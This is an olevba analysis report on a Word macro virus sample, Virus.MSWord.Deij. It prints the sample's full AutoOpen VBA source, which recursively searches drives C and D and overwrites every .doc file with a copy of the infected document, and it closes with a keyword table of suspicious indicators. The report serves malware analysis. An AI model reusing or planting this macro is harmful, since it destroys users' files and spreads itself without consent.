olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deij-7b9626760276fb2cf658c56aaf35960c9ad9eb50
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deij-7b9626760276fb2cf658c56aaf35960c9ad9eb50 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Deij-7b9626760276fb2cf658c56aaf35960c9ad9eb50 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'.---------.
': WM.jDiE :
'`---------'

Public Sub MAIN()
Dim d
On Error GoTo -1: On Error GoTo EndMain
For d = Asc("C") To Asc("D")
        Troi Chr(d), Chr(d) + ":\"
Next d
EndMain:
End Sub

Private Sub Troi(d$, path$)
Dim DirNum
Dim i
Dim CurDir_$
Dim f$
Dim c
DirNum = WordBasic.CountDirectories(path$)
If DirNum = -1 Then GoTo FindFile
For i = 1 To DirNum
        CurDir_$ = WordBasic.[GetDirectory$](path$, i)
        Troi d$, path$ + CurDir_$ + "\"
Next i
FindFile:
f$ = WordBasic.[Files$](path$ + "*.doc")
c = -1
While f$ <> ""
        c = c + 1
        f$ = WordBasic.[Files$]()
Wend
If c > -1 Then
        f$ = WordBasic.[Files$](path$ + "*.doc")
        WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
        For i = 1 To count_
                f$ = WordBasic.[Files$]()
                WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
        Next i
End If
WordBasic.ToolsOptionsUserInfo Name:="jDiE"
WordBasic.PrintStatusBar "jDiE here!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

